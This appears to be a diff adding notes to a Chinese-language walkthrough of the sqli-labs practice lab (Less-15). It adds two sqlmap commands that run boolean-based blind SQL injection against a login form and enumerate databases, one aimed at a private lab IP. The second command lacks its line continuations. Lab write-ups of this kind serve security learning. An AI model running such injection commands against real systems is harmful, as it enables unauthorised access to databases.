@@ -42,3 +42,13 @@
 ---
 直接上sqlmap
 
+sqlmap -u "ip/Less-15/" \
+  --data="uname=admin&passwd=admin" \
+  --batch --dbms=mysql --technique=B --threads=5 \
+  --string="flag.jpg" --level=5 #判断注入类型
+
+![](assets/Less-15/file-20260530224116744.png)
+
+sqlmap -u "http://10.3.187.26:8848/Less-15/" 
+  --data="uname=admin&passwd=admin" 
+  --batch --dbs --threads=5 --string="flag.jpg"
